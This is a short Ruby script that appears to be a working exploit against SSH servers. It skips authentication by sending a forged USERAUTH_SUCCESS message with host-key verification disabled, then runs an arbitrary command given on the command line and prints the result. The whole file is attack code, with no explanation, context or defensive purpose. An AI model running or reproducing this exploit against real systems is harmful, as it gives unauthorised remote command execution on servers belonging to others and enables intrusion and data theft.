#!/usr/bin/env ruby
require 'net/ssh'

host = ARGV[0]
port = ARGV[1].to_i
cmd = ARGV[2]

payload = Net::SSH::Buffer.from(:byte, Net::SSH::Authentication::Constants::USERAUTH_SUCCESS)
transport = Net::SSH::Transport::Session.new(host, {port: port, timeout: 0.75})
session = Net::SSH::Connection::Session.new(transport, { verify_host_key: :never })
session.transport.send_message(payload)
puts session.exec!(cmd)
